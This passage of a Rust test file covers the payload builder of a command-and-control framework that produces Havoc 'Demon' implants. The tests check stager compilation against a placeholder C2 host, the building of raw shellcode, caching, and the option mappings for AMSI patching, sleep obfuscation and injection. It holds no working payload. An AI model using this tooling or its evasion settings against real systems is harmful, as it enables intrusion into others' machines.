        let err = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("x86 raw shellcode must be rejected");
        assert!(
            matches!(&err, PayloadBuildError::InvalidRequest { message }
                if message.contains("x64")),
            "unexpected error: {err}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_staged_shellcode_rejects_non_http()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "smb".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });

        let err = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("staged shellcode with SMB listener must be rejected");
        assert!(
            matches!(&err, PayloadBuildError::InvalidRequest { message }
                if message.contains("HTTP listener")),
            "unexpected error: {err}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_staged_shellcode_uses_stager_template()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager' > \"$1\"; break; fi; shift; done\necho gcc-stager-ok\n";
        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        let mut messages = Vec::new();
        let artifact = service
            .build_payload(&listener, &request, |m| messages.push(m.message.clone()))
            .await?;

        assert_eq!(artifact.bytes, b"stager");
        assert_eq!(artifact.file_name, "demon.x64.exe");
        assert_eq!(artifact.format, "Windows Shellcode Staged");
        assert!(
            messages.iter().any(|m| m.contains("gcc-stager-ok")),
            "expected gcc output in messages: {messages:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_raw_shellcode_prepends_dllldr_template()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        // Compiler writes exactly "dll" as the output DLL bytes.
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'dll' > \"$1\"; break; fi; shift; done\necho gcc-raw-ok\n";
        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Raw Shellcode".to_owned(),
            config: r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#.to_owned(),
        };

        let artifact = service.build_payload(&listener, &request, |_| {}).await?;

        // DllLdr.x64.bin stub is [0x55, 0x48]; the fake gcc writes "dll".
        assert_eq!(&artifact.bytes[..2], &[0x55, 0x48], "DllLdr header not prepended");
        assert_eq!(&artifact.bytes[2..], b"dll", "DLL bytes not appended after DllLdr header");
        assert_eq!(artifact.file_name, "demon.x64.bin");
        assert_eq!(artifact.format, "Windows Raw Shellcode");
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_staged_shellcode_cache_hit_skips_compilation()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager' > \"$1\"; break; fi; shift; done\n";
        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, gcc_ok)?;

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        // First build — compiles and caches.
        let first = service.build_payload(&listener, &request, |_| {}).await?;

        // Second build — must return cache hit.
        let mut messages = Vec::new();
        let second = service
            .build_payload(&listener, &request, |m| messages.push(m.message.clone()))
            .await?;

        assert_eq!(first.bytes, second.bytes, "cached bytes must match compiled bytes");
        assert!(
            messages.iter().any(|m| m.contains("cache hit")),
            "second request should be a cache hit: {messages:?}"
        );
        Ok(())
    }

    // ── Stager generation integration tests ────────────────────────────

    #[tokio::test]
    async fn build_stager_passes_correct_defines_to_compiler()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let args_file = temp.path().join("gcc.args");
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = format!(
            "#!/bin/sh\nprintf '%s\\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager-exe' > \"$1\"; break; fi; shift; done\n",
            args_file.display()
        );
        let (service, _, _) = setup_build_fixture(&temp, nasm_ok, &gcc_ok)?;

        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http-staging".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["c2.example.com".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/stage".to_owned()],
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
        }));

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http-staging".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        let mut messages = Vec::new();
        let artifact = service
            .build_payload(&listener, &request, |m| messages.push(m.message.clone()))
            .await?;

        // Validate artifact metadata.
        assert_eq!(artifact.file_name, "demon.x64.exe");
        assert_eq!(artifact.format, "Windows Shellcode Staged");
        assert!(!artifact.bytes.is_empty(), "stager artifact must not be empty");

        // Validate that the correct -D defines were passed to the compiler.
        let gcc_args = std::fs::read_to_string(&args_file)?;
        assert!(
            gcc_args.contains("-DSTAGER_PORT=443"),
            "expected port_conn=443 in defines: {gcc_args}"
        );
        assert!(gcc_args.contains("-DSTAGER_SECURE=1"), "expected secure=1 in defines: {gcc_args}");
        // Host and URI are embedded as C byte-array initialisers.
        assert!(gcc_args.contains("-DSTAGER_HOST="), "expected STAGER_HOST define: {gcc_args}");
        assert!(gcc_args.contains("-DSTAGER_URI="), "expected STAGER_URI define: {gcc_args}");
        // Verify the entry point flag.
        assert!(
            gcc_args.contains("-e") && gcc_args.contains("WinMain"),
            "expected -e WinMain in args: {gcc_args}"
        );
        // Verify linking flags.
        assert!(gcc_args.contains("-lwininet"), "stager must link wininet: {gcc_args}");
        // Verify the stager template source was passed.
        assert!(gcc_args.contains("MainStager.c"), "stager must compile MainStager.c: {gcc_args}");

        // Validate progress messages include expected stages.
        assert!(
            messages.iter().any(|m| m.contains("starting stager build")),
            "expected 'starting stager build' in messages: {messages:?}"
        );
        assert!(
            messages.iter().any(|m| m.contains("payload generated")),
            "expected 'payload generated' in messages: {messages:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_stager_x86_uses_underscore_entry_point() -> Result<(), Box<dyn std::error::Error>>
    {
        let temp = TempDir::new()?;
        let bin_dir = temp.path().join("bin");
        let cache_dir = temp.path().join("payload-cache");
        let source_root = temp.path().join("src/Havoc/payloads/Demon");
        let shellcode_root = temp.path().join("src/Havoc/payloads");
        let gcc_x86_args = temp.path().join("gcc-x86.args");

        std::fs::create_dir_all(&bin_dir)?;
        std::fs::create_dir_all(source_root.join("src/core"))?;
        std::fs::create_dir_all(source_root.join("src/crypt"))?;
        std::fs::create_dir_all(source_root.join("src/inject"))?;
        std::fs::create_dir_all(source_root.join("src/asm"))?;
        std::fs::create_dir_all(source_root.join("src/main"))?;
        std::fs::create_dir_all(source_root.join("include"))?;
        std::fs::create_dir_all(&shellcode_root)?;
        std::fs::write(source_root.join("src/core/a.c"), "int x = 1;")?;
        std::fs::write(source_root.join("src/asm/test.x86.asm"), "bits 32")?;
        std::fs::write(source_root.join("src/main/MainExe.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainSvc.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/main/MainDll.c"), "int main(void){return 0;}")?;
        std::fs::write(source_root.join("src/Demon.c"), "int demo = 1;")?;
        std::fs::write(shellcode_root.join("Shellcode.x64.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("Shellcode.x86.bin"), [0x90, 0x90])?;
        std::fs::write(shellcode_root.join("DllLdr.x64.bin"), [0x55, 0x48])?;
        let templates_dir = temp.path().join("payloads/templates");
        std::fs::create_dir_all(&templates_dir)?;
        std::fs::write(templates_dir.join("MainStager.c"), "int main(void){return 0;}")?;

        let nasm = bin_dir.join("nasm");
        let gcc_x64 = bin_dir.join("x86_64-w64-mingw32-gcc");
        let gcc_x86 = bin_dir.join("i686-w64-mingw32-gcc");
        std::fs::write(
            &nasm,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n",
        )?;
        std::fs::write(
            &gcc_x64,
            "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager-x64' > \"$1\"; break; fi; shift; done\n",
        )?;
        std::fs::write(
            &gcc_x86,
            format!(
                "#!/bin/sh\nprintf '%s\\n' \"$@\" > '{}'\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager-x86' > \"$1\"; break; fi; shift; done\n",
                gcc_x86_args.display()
            ),
        )?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&nasm, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc_x64, std::fs::Permissions::from_mode(0o755))?;
            std::fs::set_permissions(&gcc_x86, std::fs::Permissions::from_mode(0o755))?;
        }

        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        let service = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: gcc_x64,
                compiler_x64_version: unknown_version.clone(),
                compiler_x86: gcc_x86,
                compiler_x86_version: unknown_version.clone(),
                nasm,
                nasm_version: unknown_version,
            },
            source_root,
            temp.path().join("agent/archon"),
            shellcode_root.join("Shellcode.x64.bin"),
            shellcode_root.join("Shellcode.x86.bin"),
            shellcode_root.join("DllLdr.x64.bin"),
            templates_dir.join("MainStager.c"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
            None,
            cache_dir,
        );

        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["stager.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        }));

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x86".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        let artifact = service.build_payload(&listener, &request, |_| {}).await?;

        // Validate x86 stager output.
        assert_eq!(artifact.bytes, b"stager-x86");
        assert_eq!(artifact.file_name, "demon.x86.exe");

        // The x86 stager must use the _WinMain entry point (leading underscore).
        let args = std::fs::read_to_string(&gcc_x86_args)?;
        assert!(args.contains("_WinMain"), "x86 stager must use _WinMain entry point: {args}");

        // port_conn is None so port_bind (80) should be used.
        assert!(
            args.contains("-DSTAGER_PORT=80"),
            "expected port_bind=80 when port_conn is None: {args}"
        );
        // secure=false ⇒ STAGER_SECURE=0
        assert!(args.contains("-DSTAGER_SECURE=0"), "expected secure=0 in defines: {args}");
        // Default URI is "/" when uris list is empty.
        assert!(args.contains("-DSTAGER_URI="), "expected STAGER_URI define: {args}");

        // The x64 compiler must NOT have been invoked for an x86 build.
        assert!(
            !std::path::Path::new(&temp.path().join("gcc-x64.args")).exists(),
            "x64 compiler should not be invoked for x86 stager build"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_stager_copies_template_to_compile_dir() -> Result<(), Box<dyn std::error::Error>>
    {
        let temp = TempDir::new()?;
        // A gcc stub that writes the contents of MainStager.c (its first arg)
        // into a sidecar file so we can verify the template was copied.
        let template_check = temp.path().join("template_found");
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = format!(
            "#!/bin/sh\n# Check that MainStager.c exists in cwd\nif [ -f MainStager.c ]; then cp MainStager.c '{}'; fi\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager-bin' > \"$1\"; break; fi; shift; done\n",
            template_check.display()
        );
        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, &gcc_ok)?;

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        let artifact = service.build_payload(&listener, &request, |_| {}).await?;

        assert_eq!(artifact.bytes, b"stager-bin");
        // The gcc stub copies MainStager.c from the compile dir if it exists.
        assert!(
            template_check.exists(),
            "stager template (MainStager.c) must be copied into the compile directory"
        );
        let template_content = std::fs::read_to_string(&template_check)?;
        assert_eq!(
            template_content, "int main(void){return 0;}",
            "stager template content must match the source template"
        );
        Ok(())
    }

    // ── PayloadCache isolated unit tests ────────────────────────────────

    fn test_cache_key(hex: &str, ext: &'static str) -> CacheKey {
        CacheKey { hex: hex.to_owned(), ext }
    }

    #[test]
    fn artifact_path_concatenates_hex_and_extension() {
        let cache = PayloadCache::new(PathBuf::from("/tmp/cache"));
        let key = test_cache_key("abcdef01", ".exe");
        assert_eq!(cache.artifact_path(&key), PathBuf::from("/tmp/cache/abcdef01.exe"));
    }

    #[test]
    fn artifact_path_bin_extension() {
        let cache = PayloadCache::new(PathBuf::from("/tmp/cache"));
        let key = test_cache_key("0123456789abcdef", ".bin");
        assert_eq!(cache.artifact_path(&key), PathBuf::from("/tmp/cache/0123456789abcdef.bin"));
    }

    #[test]
    fn artifact_path_dll_extension() {
        let cache = PayloadCache::new(PathBuf::from("/tmp/cache"));
        let key = test_cache_key("ff", ".dll");
        assert_eq!(cache.artifact_path(&key), PathBuf::from("/tmp/cache/ff.dll"));
    }

    #[tokio::test]
    async fn get_returns_none_for_absent_key() {
        let temp = TempDir::new().unwrap();
        let cache = PayloadCache::new(temp.path().to_path_buf());
        let key = test_cache_key("nonexistent", ".exe");
        assert!(cache.get(&key).await.is_none());
    }

    #[tokio::test]
    async fn put_then_get_round_trips_bytes() {
        let temp = TempDir::new().unwrap();
        let cache = PayloadCache::new(temp.path().to_path_buf());
        let key = test_cache_key("deadbeef", ".dll");
        let payload = b"MZ\x90\x00payload-bytes";

        cache.put(&key, payload).await;

        let got = cache.get(&key).await.expect("cache hit expected after put");
        assert_eq!(got, payload);
    }

    #[tokio::test]
    async fn get_returns_none_when_cache_dir_missing() {
        let temp = TempDir::new().unwrap();
        // Point at a sub-directory that does not exist.
        let cache = PayloadCache::new(temp.path().join("does-not-exist"));
        let key = test_cache_key("abc", ".bin");
        assert!(cache.get(&key).await.is_none());
    }

    #[tokio::test]
    async fn flush_then_get_returns_none() {
        let temp = TempDir::new().unwrap();
        let cache = PayloadCache::new(temp.path().to_path_buf());
        let key = test_cache_key("flushme", ".exe");

        cache.put(&key, b"data").await;
        assert!(cache.get(&key).await.is_some(), "should be present before flush");

        cache.flush().await.expect("flush should succeed");
        assert!(cache.get(&key).await.is_none(), "should be gone after flush");
    }

    #[tokio::test]
    async fn put_creates_cache_dir_if_absent() {
        let temp = TempDir::new().unwrap();
        let nested = temp.path().join("sub/dir");
        let cache = PayloadCache::new(nested.clone());
        let key = test_cache_key("cafebabe", ".bin");

        cache.put(&key, b"shellcode").await;

        assert!(nested.exists(), "put should create the cache directory");
        let got = cache.get(&key).await.expect("should read back after put");
        assert_eq!(got, b"shellcode");
    }

    #[tokio::test]
    async fn distinct_keys_do_not_collide() {
        let temp = TempDir::new().unwrap();
        let cache = PayloadCache::new(temp.path().to_path_buf());
        let k1 = test_cache_key("samehex", ".exe");
        let k2 = test_cache_key("samehex", ".dll");

        cache.put(&k1, b"exe-bytes").await;
        cache.put(&k2, b"dll-bytes").await;

        assert_eq!(cache.get(&k1).await.unwrap(), b"exe-bytes");
        assert_eq!(cache.get(&k2).await.unwrap(), b"dll-bytes");
    }

    // ---- PayloadBuilderService::cache accessor tests ----

    #[test]
    fn cache_accessor_returns_consistent_handle() {
        let svc = PayloadBuilderService::disabled_for_tests();
        let c1 = svc.cache();
        let c2 = svc.cache();
        // Both references must point to the same underlying cache (same
        // cache_dir). This catches accidental reconstructions or field swaps.
        assert_eq!(c1.cache_dir, c2.cache_dir);
        assert!(std::ptr::eq(c1, c2), "cache() should return the same reference each call");
    }

    #[test]
    fn cache_accessor_safe_before_any_build() {
        // Calling cache() on a freshly constructed service must not panic,
        // even though no payload has ever been built.
        let svc = PayloadBuilderService::disabled_for_tests();
        let cache = svc.cache();
        // The cache dir should be the one configured by disabled_for_tests().
        assert_eq!(cache.cache_dir, PathBuf::from("/nonexistent/payload-cache"));
    }

    #[tokio::test]
    async fn cache_accessor_observes_external_mutations() {
        let temp = TempDir::new().unwrap();
        let cache_dir = temp.path().join("payload-cache");
        let svc = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: PathBuf::from("/nonexistent/x64-gcc"),
                compiler_x64_version: ToolchainVersion {
                    major: 0,
                    minor: 0,
                    patch: 0,
                    raw: "0.0.0".to_owned(),
                },
                compiler_x86: PathBuf::from("/nonexistent/x86-gcc"),
                compiler_x86_version: ToolchainVersion {
                    major: 0,
                    minor: 0,
                    patch: 0,
                    raw: "0.0.0".to_owned(),
                },
                nasm: PathBuf::from("/nonexistent/nasm"),
                nasm_version: ToolchainVersion {
                    major: 0,
                    minor: 0,
                    patch: 0,
                    raw: "0.0.0".to_owned(),
                },
            },
            PathBuf::from("/nonexistent/src"),
            PathBuf::from("/nonexistent/archon"),
            PathBuf::from("/nonexistent/sc64"),
            PathBuf::from("/nonexistent/sc86"),
            PathBuf::from("/nonexistent/dllldr"),
            PathBuf::from("/nonexistent/stager"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                allow_legacy_ctr: false,
            },
            None,
            cache_dir.clone(),
        );

        // Populate the cache through the accessor-returned handle.
        let key = test_cache_key("aabbccdd", ".bin");
        svc.cache().put(&key, b"test-payload").await;

        // Read back through the same accessor — proves mutations are visible.
        let got = svc.cache().get(&key).await.expect("should read back cached artifact");
        assert_eq!(got, b"test-payload");

        // Flush through the accessor and verify the cache is empty.
        let removed = svc.cache().flush().await.expect("flush should succeed");
        assert_eq!(removed, 1);
        assert!(svc.cache().get(&key).await.is_none(), "cache should be empty after flush");
    }

    // ── PayloadCache edge-case & concurrency tests ─────────────────────

    #[tokio::test]
    async fn get_returns_truncated_bytes_from_corrupted_cache_entry() {
        let temp = TempDir::new().unwrap();
        let cache = PayloadCache::new(temp.path().to_path_buf());
        let key = test_cache_key("corrupt01", ".exe");

        // Simulate a full artifact write followed by on-disk truncation
        // (e.g. disk full during a previous `put`).
        let original = b"MZ\x90\x00FULL-PAYLOAD-CONTENT-HERE";
        cache.put(&key, original).await;

        // Manually truncate the cached file to simulate corruption.
        let path = cache.artifact_path(&key);
        let truncated = &original[..4]; // only the MZ header stub
        tokio::fs::write(&path, truncated).await.unwrap();

        // `get` performs no integrity validation — it returns whatever bytes
        // are on disk, even if they are shorter than the original artifact.
        let got = cache.get(&key).await.expect("file exists, so get returns Some");
        assert_eq!(got, truncated, "get should return the truncated bytes verbatim");
        assert_ne!(got.len(), original.len(), "truncated content differs from original");
    }

    #[tokio::test]
    async fn get_returns_empty_bytes_for_zero_length_cache_file() {
        let temp = TempDir::new().unwrap();
        let cache = PayloadCache::new(temp.path().to_path_buf());
        let key = test_cache_key("empty01", ".bin");

        // Create a zero-length file (worst-case truncation).
        tokio::fs::create_dir_all(temp.path()).await.unwrap();
        tokio::fs::write(cache.artifact_path(&key), b"").await.unwrap();

        let got = cache.get(&key).await.expect("file exists, so get returns Some");
        assert!(got.is_empty(), "zero-length cached file should return empty bytes");
    }

    #[tokio::test]
    #[cfg(unix)]
    async fn put_succeeds_gracefully_when_cache_dir_is_read_only() {
        use std::os::unix::fs::PermissionsExt;

        let temp = TempDir::new().unwrap();
        let cache_dir = temp.path().join("readonly-cache");
        std::fs::create_dir_all(&cache_dir).unwrap();

        // Pre-populate one entry so we can verify reads still work.
        let pre_key = test_cache_key("preexist", ".exe");
        let cache = PayloadCache::new(cache_dir.clone());
        cache.put(&pre_key, b"existing-data").await;

        // Make the directory read-only.
        std::fs::set_permissions(&cache_dir, std::fs::Permissions::from_mode(0o555)).unwrap();

        // Writing to a read-only directory should fail gracefully (no panic).
        let key = test_cache_key("readonly01", ".bin");
        cache.put(&key, b"should-not-persist").await; // must not panic

        // The failed write should not have created the file.
        assert!(
            cache.get(&key).await.is_none(),
            "put to read-only dir should not create a cache entry"
        );

        // Pre-existing entries should still be readable.
        let got = cache.get(&pre_key).await.expect("pre-existing entry should still be readable");
        assert_eq!(got, b"existing-data");

        // Restore permissions so TempDir cleanup succeeds.
        std::fs::set_permissions(&cache_dir, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[tokio::test]
    async fn concurrent_puts_with_same_key_both_succeed() {
        let temp = TempDir::new().unwrap();
        let cache = PayloadCache::new(temp.path().to_path_buf());
        let key_hex = "racekey01";
        let ext = ".dll";

        let payload_a = vec![0xAAu8; 1024];
        let payload_b = vec![0xBBu8; 1024];

        // Spawn two concurrent puts with the same cache key.
        let cache_a = cache.clone();
        let cache_b = cache.clone();
        let pa = payload_a.clone();
        let pb = payload_b.clone();

        let ((), ()) = tokio::join!(
            async move {
                let k = test_cache_key(key_hex, ext);
                cache_a.put(&k, &pa).await;
            },
            async move {
                let k = test_cache_key(key_hex, ext);
                cache_b.put(&k, &pb).await;
            },
        );

        // Neither put should panic or error.
        // The file should contain one of the two payloads (last-writer-wins).
        let key = test_cache_key(key_hex, ext);
        let got = cache.get(&key).await.expect("cache entry should exist after concurrent puts");
        assert!(
            got == payload_a || got == payload_b,
            "cached bytes must be one of the two payloads, not a mix"
        );
        assert_eq!(got.len(), 1024, "cached artifact must not be partially written");
    }

    #[tokio::test]
    async fn concurrent_put_and_get_does_not_panic() {
        let temp = TempDir::new().unwrap();
        let cache = PayloadCache::new(temp.path().to_path_buf());
        let key_hex = "racerw01";
        let ext = ".exe";
        let payload = vec![0xCCu8; 2048];

        // Pre-populate so the reader has something to find.
        let pre_key = test_cache_key(key_hex, ext);
        cache.put(&pre_key, &payload).await;

        let cache_w = cache.clone();
        let cache_r = cache.clone();
        let pw = payload.clone();

        // Run a put and a get concurrently against the same key.
        let ((), read_result) = tokio::join!(
            async move {
                let k = test_cache_key(key_hex, ext);
                cache_w.put(&k, &pw).await;
            },
            async move {
                let k = test_cache_key(key_hex, ext);
                cache_r.get(&k).await
            },
        );

        // The get may return the old or new data — either is acceptable.
        // The critical property is that neither operation panics and the
        // file is not left in an invalid intermediate state.
        if let Some(bytes) = read_result {
            assert_eq!(bytes.len(), 2048, "read bytes must be complete, not partially written");
        }
        // If read_result is None, the file was briefly absent during the write — also acceptable.
    }

    // ── replace_all byte replacement tests ────────────────────────────────

    #[test]
    fn replace_all_replaces_single_occurrence() {
        let haystack = b"hello world".to_vec();
        let result = replace_all(haystack, b"world", b"earth");
        assert_eq!(result, b"hello earth");
    }

    #[test]
    fn replace_all_replaces_multiple_occurrences() {
        let haystack = b"aXaXa".to_vec();
        let result = replace_all(haystack, b"X", b"Y");
        assert_eq!(result, b"aYaYa");
    }

    #[test]
    fn replace_all_no_match_returns_unchanged() {
        let haystack = b"hello world".to_vec();
        let result = replace_all(haystack.clone(), b"xyz", b"abc");
        assert_eq!(result, haystack);
    }

    #[test]
    fn replace_all_empty_needle_returns_unchanged() {
        let haystack = b"hello".to_vec();
        let result = replace_all(haystack.clone(), b"", b"x");
        assert_eq!(result, haystack);
    }

    #[test]
    fn replace_all_same_length_replacement() {
        let haystack = b"AAAA".to_vec();
        let result = replace_all(haystack, b"AA", b"BB");
        assert_eq!(result, b"BBBB");
    }

    #[test]
    fn replace_all_with_null_padded_replacement() {
        // Simulates the PE string replacement where replacement is
        // null-padded to match the original string length.
        let haystack = b"old_string_here".to_vec();
        let mut replacement = b"new".to_vec();
        replacement.resize(b"old_string_here".len(), 0);
        let result = replace_all(haystack, b"old_string_here", &replacement);
        assert_eq!(&result[..3], b"new");
        assert!(result[3..].iter().all(|&b| b == 0));
    }

    // ── sleep/proxy/amsi value mapping tests ──────────────────────────────

    #[test]
    fn sleep_obfuscation_value_maps_known_techniques() {
        assert_eq!(sleep_obfuscation_value("Foliage"), 3);
        assert_eq!(sleep_obfuscation_value("Ekko"), 1);
        assert_eq!(sleep_obfuscation_value("Zilean"), 2);
    }

    #[test]
    fn sleep_obfuscation_value_returns_zero_for_unknown() {
        assert_eq!(sleep_obfuscation_value("WaitForSingleObjectEx"), 0);
        assert_eq!(sleep_obfuscation_value("Unknown"), 0);
        assert_eq!(sleep_obfuscation_value(""), 0);
    }

    #[test]
    fn sleep_jump_bypass_returns_zero_when_obfuscation_disabled() {
        assert_eq!(sleep_jump_bypass(0, Some("jmp rax")).unwrap(), 0);
        assert_eq!(sleep_jump_bypass(0, Some("jmp rbx")).unwrap(), 0);
        assert_eq!(sleep_jump_bypass(0, None).unwrap(), 0);
    }

    #[test]
    fn sleep_jump_bypass_maps_gadgets_when_obfuscation_enabled() {
        assert_eq!(sleep_jump_bypass(1, Some("jmp rax")).unwrap(), 1);
        assert_eq!(sleep_jump_bypass(1, Some("jmp rbx")).unwrap(), 2);
        assert_eq!(sleep_jump_bypass(1, None).unwrap(), 0);
        assert_eq!(sleep_jump_bypass(1, Some("unknown")).unwrap(), 0);
    }

    #[test]
    fn proxy_loading_value_maps_known_methods() {
        assert_eq!(proxy_loading_value(Some("RtlRegisterWait")), 1);
        assert_eq!(proxy_loading_value(Some("RtlCreateTimer")), 2);
        assert_eq!(proxy_loading_value(Some("RtlQueueWorkItem")), 3);
    }

    #[test]
    fn proxy_loading_value_defaults_to_zero() {
        assert_eq!(proxy_loading_value(None), 0);
        assert_eq!(proxy_loading_value(Some("None (LdrLoadDll)")), 0);
        assert_eq!(proxy_loading_value(Some("unknown")), 0);
    }

    #[test]
    fn amsi_patch_value_maps_known_methods() {
        assert_eq!(amsi_patch_value(Some("Hardware breakpoints")), 1);
        assert_eq!(amsi_patch_value(Some("Memory")), 2);
    }

    #[test]
    fn amsi_patch_value_defaults_to_zero() {
        assert_eq!(amsi_patch_value(None), 0);
        assert_eq!(amsi_patch_value(Some("")), 0);
        assert_eq!(amsi_patch_value(Some("unknown")), 0);
    }

    // ── injection_mode tests ──────────────────────────────────────────────

    #[test]
    fn injection_mode_maps_known_values() -> Result<(), PayloadBuildError> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Alloc": "Win32",
            "Execute": "Native/Syscall"
        }))
        .unwrap();
        assert_eq!(injection_mode(&config, "Alloc")?, 1);
        assert_eq!(injection_mode(&config, "Execute")?, 2);
        Ok(())
    }

    #[test]
    fn injection_mode_returns_zero_for_unknown() -> Result<(), PayloadBuildError> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Alloc": "Unknown"
        }))
        .unwrap();
        assert_eq!(injection_mode(&config, "Alloc")?, 0);
        Ok(())
    }

    // ── Architecture::parse tests ─────────────────────────────────────────

    #[test]
    fn architecture_parse_accepts_x64_case_insensitive() {
        assert_eq!(Architecture::parse("x64").unwrap(), Architecture::X64);
        assert_eq!(Architecture::parse("X64").unwrap(), Architecture::X64);
